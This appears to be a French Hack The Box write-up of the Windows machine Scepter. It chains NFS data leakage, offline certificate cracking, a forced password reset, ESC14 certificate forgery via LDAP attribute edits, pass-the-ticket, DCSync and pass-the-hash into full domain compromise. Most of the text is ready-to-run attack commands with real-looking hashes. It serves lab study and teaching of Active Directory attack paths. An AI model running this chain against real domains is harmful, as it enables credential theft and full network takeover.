
# HTB Write-up : Scepter (Partie 1 - Reconnaissance & Accès Initial)

## 1. Introduction et Posture

**Scepter** est une machine Windows de niveau difficile (Hard) fortement axée sur l'Active Directory et l'exploitation des services de certificats (AD CS). Le chemin de compromission demande de la rigueur : on commence par une fuite de données sur un partage réseau (NFS), qui nous mène à du cracking hors-ligne. Ensuite, c'est un enchaînement d'abus de configurations LDAP et de modèles de certificats (vulnérabilités de type **ESC14**) pour pivoter d'utilisateur en utilisateur, contourner le groupe **Protected Users**, et finalement exécuter un **DCSync**.

L'état d'esprit ici : on est face à une infrastructure d'entreprise typique. Chaque erreur de configuration (permissions LDAP, templates AD CS) doit être identifiée et chaînée.

## 2. Reconnaissance Initiale (Nmap)

Depuis mon environnement **Exegol**, je lance un scan de ports TCP complet pour cartographier la surface d'attaque. On commence toujours par un balayage rapide pour identifier les ports ouverts, suivi d'un scan ciblé avec les scripts par défaut et la détection de version.

Bash

```
# Scan initial de tous les ports
nmap -p- --min-rate 10000 10.10.11.65

# Scan approfondi sur les ports découverts
nmap -p 53,88,111,135,139,389,445,464,593,636,2049,5985,5986,9389 -sCV 10.10.11.65
```

**Analyse des résultats Nmap :**

- **Ports classiques d'un Contrôleur de Domaine (DC) :** DNS (53), Kerberos (88, 464), RPC (135, 593), SMB (139, 445), LDAP (389, 636), ADWS (9389).
    
- **Identifiants clés :** Le domaine est `scepter.htb` et le nom d'hôte est `DC01`.
    
- **Vecteurs d'entrée potentiels :**
    
    - **NFS (2049) avec support RPC (111) :** C'est inhabituel sur un DC Windows et c'est notre première piste majeure. Un partage NFS mal configuré est une mine d'or pour la fuite d'informations.
        
    - **WinRM (5985, 5986) :** C'est le port de gestion à distance Windows. On le garde en tête pour obtenir un **shell** une fois que nous aurons des identifiants valides.
        

_Bonne pratique :_ J'ajoute immédiatement les noms d'hôtes dans mon fichier `/etc/hosts` pour faciliter la résolution DNS par nos outils. On peut automatiser ça avec `netexec` :

Bash

```
netexec smb 10.10.11.65 --generate-hosts-file scepter_hosts
cat scepter_hosts | sudo tee -a /etc/hosts
```

## 3. Énumération du point d'entrée : NFS (Network File System)

Le port 2049 est ouvert. Le service NFS permet de partager des répertoires sur un réseau. J'utilise `showmount` (du paquet `nfs-common`) pour interroger le service RPC et lister les volumes exportés (partagés).

Bash

```
showmount -e dc01.scepter.htb
```

_Output :_ `/helpdesk (everyone)`

Le volume `/helpdesk` est accessible à tous sans authentification. Je le monte sur mon système local pour l'explorer.

Bash

```
sudo mount -t nfs dc01.scepter.htb:/helpdesk /mnt
ls -l /mnt/
```

**Découverte :** Le dossier contient cinq fichiers liés à des infrastructures à clé publique (PKI) :

- `baker.crt` (Le certificat public)
    
- `baker.key` (La clé privée, format PEM)
    
- `clark.pfx`, `lewis.pfx`, `scott.pfx` (Archives PKCS#12 contenant à la fois le certificat et la clé privée)
    

Je copie ces fichiers sur ma machine de pentest pour travailler proprement et je démonte le share.

## 4. Analyse et Cracking Offline des Certificats

En inspectant le fichier `baker.crt`, je lis en clair les métadonnées qui confirment qu'il appartient à `d.baker@scepter.htb`. Cependant, la clé privée `baker.key` est chiffrée (indiqué par `-----BEGIN ENCRYPTED PRIVATE KEY-----`).

Les fichiers `.pfx` sont par nature des conteneurs chiffrés. Si j'essaie de les lire avec `openssl`, on me demande un mot de passe d'importation.

### Le Schéma Mental du Cracking

Nous n'avons aucun identifiant. La seule option logique est une attaque par dictionnaire (brute-force hors-ligne). L'avantage du cracking offline, c'est qu'il ne génère aucun trafic réseau et ne déclenche pas de verrouillage de compte (Account Lockout) côté Active Directory.

Pour cracker ces fichiers, il faut d'abord extraire leurs **hashes** dans un format compréhensible par nos outils de cracking (`John the Ripper` ou `Hashcat`).

**Étape 1 : Extraction des hashes**

J'utilise les utilitaires Python intégrés à John :

Bash

```
# Pour les fichiers PFX
pfx2john.py clark.pfx > pfx.hashes
pfx2john.py lewis.pfx >> pfx.hashes
pfx2john.py scott.pfx >> pfx.hashes

# Pour la clé PEM de d.baker
pem2john.py baker.key | tee baker.hash
```

**Étape 2 : Cracking des fichiers PFX avec John**

Les modules PFX ne sont pas toujours nativement bien gérés par Hashcat, John est plus direct ici. J'utilise la classique wordlist `rockyou.txt`.

Bash

```
john pfx.hashes --wordlist=rockyou.txt
```

_Résultat :_ Tous les fichiers `.pfx` partagent le même mot de passe : `newpassword`.

**Étape 3 : Cracking de la clé PEM avec Hashcat**

Le hash généré par `pem2john` a une syntaxe spécifique (`$PEM$2$pbkdf2$sha256$aes256_cbc...`). Pour le passer à Hashcat, il faut parfois nettoyer le préfixe. En retirant `$pbkdf2$sha256$aes256_cbc`, le format correspond exactement au mode **24420** de Hashcat (PKCS#8 Private Keys).

Bash

```
hashcat -m 24420 baker.hash rockyou.txt
```

_Résultat :_ Le mot de passe de la clé de `baker` est également `newpassword`.

## 5. Authentification Kerberos initiale (TGT)

Maintenant que j'ai les mots de passe des conteneurs cryptographiques, je peux extraire les noms d'utilisateurs exacts (ex: `m.clark`, `e.lewis`, `o.scott`) via `openssl pkcs12`.

L'objectif est d'utiliser ces certificats clients pour demander un **TGT (Ticket Granting Ticket)** au KDC (Key Distribution Center) de l'Active Directory. C'est l'authentification PKINIT (Public Key Cryptography for Initial Authentication in Kerberos).

Je tente de demander un TGT pour `o.scott` avec l'outil `gettgtpkinit.py` (de la suite PKINITtools) ou avec **Certipy** :

Bash

```
gettgtpkinit.py -pfx-pass newpassword -cert-pfx scott.pfx scepter.htb/o.scott o.scott.ccache
```

**Le mur :** Je reçois une erreur `KDC_ERR_CLIENT_REVOKED` (Clients credentials have been revoked).

C'est un comportement très intéressant. Sur le moment, on pourrait penser que le certificat lui-même a été révoqué (via une CRL - Certificate Revocation List). En réalité, dans un environnement AD, cette erreur remonte souvent si le **compte utilisateur lui-même est désactivé** ou si son mot de passe a expiré. Je garde cette information en tête, nous le vérifierons une fois Domain Admin (Beyond Root).

**Le succès avec d.baker :**

Je sais que j'ai la clé de `d.baker` et son certificat public. Je vais les fusionner dans un nouveau fichier `.pfx` propre pour l'utiliser avec Certipy.

Bash

```
# Génération du PFX. On entre "newpassword" pour décrypter baker.key, 
# puis on peut laisser le mot de passe d'exportation vide pour simplifier l'usage avec Certipy.
openssl pkcs12 -export -inkey baker.key -in baker.crt -out baker.pfx

# Synchronisation de l'horloge (Crucial pour Kerberos)
sudo ntpdate scepter.htb

# Demande du TGT et extraction du hash NTLM
certipy auth -pfx baker.pfx -dc-ip 10.10.11.65
```

**Bingo.** Certipy me confirme l'identité (`d.baker@scepter.htb`), récupère un **TGT** (sauvegardé dans `d.baker.ccache`) et me renvoie le **hash NTLM** de l'utilisateur via U2U (User-to-User) Kerberos.

Plaintext

```
[*] Got hash for 'd.baker@scepter.htb': aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce
```

Je valide mes accès avec `netexec` en SMB (via le hash NTLM ou via le ticket Kerberos en injectant la variable d'environnement `KRB5CCNAME`).

Bash

```
netexec smb scepter.htb -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce
# OU
KRB5CCNAME=d.baker.ccache netexec smb scepter.htb -k --use-kcache
```

Le statut `[+]` confirme que l'authentification est valide. Cependant, `d.baker` n'a pas les droits pour se connecter en WinRM. Il va falloir énumérer l'AD pour pivoter.

#  Scepter (Partie 2 - AD CS, ESC14 & Protected Users)

## 1. Énumération Active Directory et Premier Pivot (BloodHound)

Avec le hash NTLM de `d.baker` validé, la première étape post-authentification consiste toujours à cartographier les chemins de compromission du domaine. J'utilise `netexec` pour collecter les données **BloodHound** via LDAP.

Bash

```
# Collecte BloodHound via Netexec (LDAP)
netexec ldap scepter.htb -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce --bloodhound --dns-server 10.10.11.65
```

**Analyse du graphe :**

Une fois les données importées dans BloodHound, je marque `d.baker` comme _Owned_ et j'observe ses relations sortantes (_Outbound Control_). Le graphe révèle un chemin direct très utile :

`d.baker` possède le privilège **ForceChangePassword** sur l'utilisateur `a.carter`.

_Schéma mental :_ Le droit `ForceChangePassword` (souvent lié à l'ACL `User-Force-Change-Password`) permet à un utilisateur de réinitialiser le mot de passe d'une cible sans connaître l'ancien. C'est un vecteur d'élévation de privilèges horizontal ou vertical basique mais redoutable.

J'exploite ce droit immédiatement avec `netexec` pour prendre le contrôle de `a.carter` :

Bash

```
# Réinitialisation du mot de passe de a.carter
netexec smb scepter.htb -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce -M change-password -o USER=a.carter NEWPASS=Welcome1!

# Validation des nouveaux accès
netexec smb scepter.htb -u a.carter -p Welcome1!
```

L'accès est validé, mais tout comme `d.baker`, `a.carter` n'a pas les droits pour ouvrir une session WinRM distante. Il faut creuser plus loin.

## 2. Découverte de la Vulnérabilité (AD CS & LDAP)

En reprenant l'analyse BloodHound et les groupes LDAP, je constate que `a.carter` est membre du groupe **IT Support**. Ce groupe possède un droit critique : **GenericAll** (contrôle total) sur l'Unité Organisationnelle (OU) _Staff Access_. Or, l'utilisateur `d.baker` se trouve justement dans cette OU.

Concrètement, `a.carter` peut modifier n'importe quel attribut LDAP de `d.baker`.

### Énumération des Certificats (Certipy)

Puisque le domaine utilise Active Directory Certificate Services (AD CS), je lance une recherche de modèles (templates) vulnérables :

Bash

```
certipy find -vulnerable -u d.baker -hashes :18b5fb0d99e7a475316213c15b6f22ce -dc-ip 10.10.11.65 -stdout
```

L'outil remonte le template **StaffAccessCertificate**. Analysons ses propriétés clés :

- **Enrollee :** Le groupe _Staff_ a le droit de demander ce certificat (Enrollment Rights). `d.baker` est membre de ce groupe.
    
- **Certificate Name Flag :** `SubjectAltRequireEmail`. C'est l'élément déclencheur. Cela signifie que le certificat généré inclura l'adresse e-mail de l'utilisateur demandeur dans le champ _Subject Alternative Name_ (SAN).
    

### Analyse de la cible : h.brown

En fouillant les autres utilisateurs via des requêtes LDAP ciblées, un attribut très spécifique saute aux yeux sur le compte de l'utilisateur `h.brown` :

Bash

```
# Requête LDAP détaillée sur h.brown
netexec ldap scepter.htb -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce --query "(sAMAccountName=h.brown)" ""
```

_Output intéressant :_ `altSecurityIdentities: X509:<RFC822>h.brown@scepter.htb`

**Le concept technique :** L'attribut **altSecurityIdentities** est utilisé par Windows pour lier un certificat explicite à un compte utilisateur. Ici, le préfixe `<RFC822>` indique que le système acceptera une authentification Kerberos si le certificat présenté contient l'adresse e-mail `h.brown@scepter.htb` dans son SAN.

## 3. Le Schéma d'Attaque Logique (Type ESC14)

Nous avons toutes les pièces du puzzle. Voici le déroulé logique de l'attaque :

1. Je contrôle `a.carter` qui a les droits **GenericAll** sur l'objet `d.baker`.
    
2. J'utilise `a.carter` pour modifier l'attribut LDAP `mail` de `d.baker`, et je le remplace par la valeur attendue par la cible : `h.brown@scepter.htb`.
    
3. Je demande un certificat via le template _StaffAccessCertificate_ en utilisant le compte de `d.baker`.
    
4. L'Autorité de Certification (CA) lit l'attribut `mail` modifié de `d.baker` et l'inscrit dans le SAN du certificat.
    
5. Je présente ce certificat falsifié au contrôleur de domaine. Le DC lit l'e-mail dans le certificat, le compare avec l'attribut **altSecurityIdentities** de `h.brown`, trouve une correspondance, et m'accorde un ticket Kerberos (TGT) au nom de `h.brown`.
    

## 4. Exécution de l'Usurpation d'Identité

Pour manipuler les attributs LDAP depuis mon environnement Linux, j'utilise l'excellent outil **bloodyAD**.

**Étape 1 : Falsification de l'attribut mail**

Bash

```
# a.carter modifie l'attribut 'mail' de d.baker
bloodyAD --host dc01.scepter.htb -d scepter.htb -u a.carter -p Welcome1! set object d.baker mail -v h.brown@scepter.htb
```

**Étape 2 : Demande du certificat piégé**

Bash

```
# d.baker demande le certificat (qui inclura le faux mail)
certipy req -username d.baker@scepter.htb -hashes :18b5fb0d99e7a475316213c15b6f22ce -target dc01.scepter.htb -ca scepter-DC01-CA -template StaffAccessCertificate -dc-ip 10.10.11.65
```

Cela génère le fichier `d.baker.pfx`. Si tu l'inspectes avec `openssl x509 -text`, tu verras bien `Subject: CN = d.baker, emailAddress = h.brown@scepter.htb`. Le piège est tendu.

**Étape 3 : Authentification en tant que cible**

Bash

```
# On utilise le certificat pour usurper h.brown
certipy auth -pfx d.baker.pfx -dc-ip 10.10.11.65 -domain scepter.htb -username h.brown
```

Succès. Certipy me sauvegarde un TGT (`h.brown.ccache`) et réussit à extraire son hash NTLM : `4ecf5242092c6fb8c360a08069c75a0c`.

## 5. Contournement du groupe Protected Users

J'ai le hash NTLM de `h.brown`, je tente de me connecter pour obtenir mon premier vrai shell :

Bash

```
evil-winrm -i dc01.scepter.htb -u h.brown -H 4ecf5242092c6fb8c360a08069c75a0c
# Erreur : WinRMAuthorizationError
```

Accès refusé. Pourquoi ? En regardant les groupes de `h.brown`, on remarque qu'il appartient au groupe natif **Protected Users**.

_Explication pragmatique :_ Le groupe `Protected Users` est une excellente mesure de sécurité de Microsoft. Les membres de ce groupe subissent des restrictions sévères pour limiter les vols d'identifiants (credentials theft). L'une des règles fondamentales est que **l'authentification NTLM est strictement interdite**. Seul Kerberos est autorisé.

Ce n'est pas un problème, puisque Certipy m'a généré un fichier `.ccache` (le fameux TGT). Je vais réaliser un **Pass-the-Ticket (PtT)**.

Bash

```
# Utilisation du ticket Kerberos avec Evil-WinRM
KRB5CCNAME=h.brown.ccache evil-winrm -i dc01.scepter.htb -r scepter.htb
```

La connexion s'établit. Je suis connecté sur `DC01` en tant que `h.brown` et je peux lire le premier flag `user.txt`.


#  Scepter (Partie 3 - ACLs, DCSync & Beyond Root)

## 1. Énumération Locale et Groupes (h.brown)

Nous avons obtenu un accès WinRM sur `DC01` en tant que `h.brown`. La première étape d'une post-exploitation propre consiste à faire un état des lieux de notre environnement d'exécution.

Je fouille rapidement le système de fichiers (`C:\Users`, `C:\HelpDesk`), mais rien de critique n'y est stocké en dehors de notre `user.txt`. La vraie valeur ajoutée se trouve dans le **LDAP**.

J'analyse les groupes de `h.brown` :

- `Domain Users` (Standard)
    
- `Remote Management Users` (Ce qui nous a permis d'utiliser WinRM)
    
- `Protected Users` (Ce qui nous a obligés à utiliser un TGT Kerberos au lieu du NTLM)
    
- **`Helpdesk Admins`**
    
- **`CMS`**
    

Les groupes `Helpdesk Admins` et `CMS` ne sont pas standards. Ce sont des groupes métiers créés spécifiquement sur ce domaine. C'est systématiquement là qu'il faut creuser pour trouver des erreurs d'**ACLs (Access Control Lists)**.

## 2. Définition de la Cible (BloodHound)

Sans visibilité, je retourne sur mes données BloodHound collectées précédemment. J'utilise la requête pré-intégrée _Shortest Paths to Domain Admin_. Le graphe est épuré, mais un utilisateur précis se démarque : `p.adams`.

Pourquoi cibler `p.adams` ?

Il est membre du groupe natif **Replication Operators**.

_Schéma mental :_ Le groupe `Replication Operators` (ou les droits équivalents `DS-Replication-Get-Changes` et `DS-Replication-Get-Changes-All`) permet à un compte de simuler le comportement d'un contrôleur de domaine légitime pour demander la réplication des données de l'AD. C'est la porte grande ouverte pour l'attaque **DCSync**. Si je compromets `p.adams`, je compromets tout le domaine.

## 3. Analyse des Privilèges (dsacls & bloodyAD)

Comment passer de `h.brown` à `p.adams` ? Je dois déterminer si mon utilisateur (ou l'un de ses groupes, comme `CMS`) possède des droits d'écriture sur cette cible.

J'utilise `bloodyAD` avec mon TGT valide pour demander l'ensemble des objets sur lesquels `h.brown` possède des droits d'écriture :

Bash

```
# Énumération des droits d'écriture effectifs
KRB5CCNAME=h.brown.ccache bloodyAD --host dc01.scepter.htb -d scepter.htb -k get writable --detail
```

_Output partiel :_

Plaintext

```
distinguishedName: CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb
altSecurityIdentities: WRITE
```

La confirmation peut aussi se faire via l'outil natif Windows `dsacls` directement depuis notre session WinRM :

PowerShell

```
dsacls "CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb"
```

On y lit clairement que le groupe `CMS` (dont nous faisons partie) possède l'autorisation spéciale (`WRITE PROPERTY`) sur l'attribut **altSecurityIdentities** de `p.adams`.

## 4. Répétition de la mécanique ESC14

Nous sommes exactement dans la même configuration logique qu'en Partie 2, mais un cran plus haut dans la chaîne de privilèges.

La cible `p.adams` ne possède actuellement aucun attribut `altSecurityIdentities`. Nous allons lui en créer un sur mesure, puis réutiliser notre accès à `a.carter` (qui contrôle toujours `d.baker`) pour générer un certificat valide.

**Étape 1 : Injection de l'identité alternative sur la cible**

J'injecte une adresse e-mail arbitraire (ex: `tristan@scepter.htb`) dans l'objet de `p.adams` en utilisant les droits de `h.brown`.

Bash

```
KRB5CCNAME=h.brown.ccache bloodyAD --host DC01.scepter.htb -d scepter.htb -k set object p.adams altSecurityIdentities -v 'X509:<RFC822>tristan@scepter.htb'
```

**Étape 2 : Falsification du compte enrolleur (d.baker)**

Je reprends mon accès `a.carter` (cf. Partie 2) pour modifier l'e-mail de `d.baker` et le faire correspondre à celui que je viens d'injecter.

Bash

```
bloodyAD --host dc01.scepter.htb -d scepter.htb -u a.carter -p Welcome1! set object d.baker mail -v tristan@scepter.htb
```

**Étape 3 : Demande du certificat piégé et Usurpation**

Je demande le certificat avec `d.baker`. L'AD CS va lire l'attribut `mail` de `d.baker` (`tristan@scepter.htb`) et le placer dans le **SAN** du certificat.

Bash

```
# Génération du PFX falsifié
certipy req -username d.baker@scepter.htb -hashes :18b5fb0d99e7a475316213c15b6f22ce -target dc01.scepter.htb -ca scepter-DC01-CA -template StaffAccessCertificate -dc-ip 10.10.11.65

# Authentification en tant que p.adams
certipy auth -pfx d.baker.pfx -dc-ip 10.10.11.65 -domain scepter.htb -username p.adams
```

Le KDC valide la demande Kerberos car l'e-mail du certificat correspond à l'attribut **altSecurityIdentities** que nous avons forcé sur `p.adams`. Certipy me retourne le hash NTLM de `p.adams` et son TGT (`p.adams.ccache`).

## 5. DCSync et Compromission Totale (Root)

Avec le TGT de `p.adams`, je possède désormais les droits de réplication de l'Active Directory (protocole **MS-DRSR**). Je n'ai même pas besoin de me connecter au serveur, je lance directement un **DCSync** depuis ma machine Exegol avec `secretsdump.py`.

Bash

```
# Exécution du DCSync sans mot de passe (via hash NTLM)
secretsdump.py scepter.htb/p.adams@DC01.scepter.htb -hashes :1b925c524f447bb821a8789c4b118ce0 -no-pass
```

L'outil extrait la base NTDS.dit et dump tous les secrets du domaine, y compris les clés Kerberos et les hashes NTLM. Je récupère le graal : le hash de l'utilisateur **Administrator**.

Plaintext

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a291ead3493f9773dc615e66c2ea21c4:::
```

Il ne reste plus qu'à effectuer un **Pass-the-Hash (PtH)** pour obtenir le shell final et lire `root.txt`.

Bash

```
evil-winrm -i DC01.scepter.htb -u administrator -H a291ead3493f9773dc615e66c2ea21c4
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
```

La machine est Pwned.

---

## 6. Beyond Root : Démystification des erreurs initiales

Un bon Red Teamer ne laisse pas de zones d'ombre. Rappelle-toi de la Partie 1 : lors du cracking des certificats trouvés sur le share NFS (`o.scott`, `m.clark`, `e.lewis`), Kerberos nous retournait l'erreur `KDC_ERR_CLIENT_REVOKED`.

Maintenant que je suis `Administrator`, je peux interroger l'AD pour comprendre **pourquoi**.

PowerShell

```
# Vérification du statut de l'utilisateur m.clark
Get-ADUser m.clark
```

_Constat :_ La propriété `Enabled` est définie sur `False`. Le compte était tout simplement **désactivé**.

Que se passe-t-il si je réactive le compte ?

PowerShell

```
net user m.clark /active:yes
```

Je relance mon authentification `certipy auth` avec le certificat de `m.clark`. Nouvelle erreur : `KDC_ERR_KEY_EXPIRED (Password has expired)`.

Je force un nouveau mot de passe :

PowerShell

```
net user m.clark password123!
```

Je relance l'authentification avec le même certificat récupéré sur le share NFS, et cette fois-ci, **j'obtiens un TGT valide**.

**Conclusion technique :** Contrairement à ce que le message d'erreur `KDC_ERR_CLIENT_REVOKED` laisse supposer, le certificat PKCS#12 n'était pas révoqué au niveau de l'Autorité de Certification (pas de CRL impliquée ici).

L'authentification PKINIT (**passwordless authentication**) est profondément liée à l'état du compte Active Directory. Si le compte est désactivé ou si son mot de passe expire (même s'il n'est pas utilisé pour se connecter), le contrôleur de domaine refusera de délivrer le TGT. C'est une nuance d'infrastructure cruciale à comprendre lors de l'audit d'environnements AD CS.
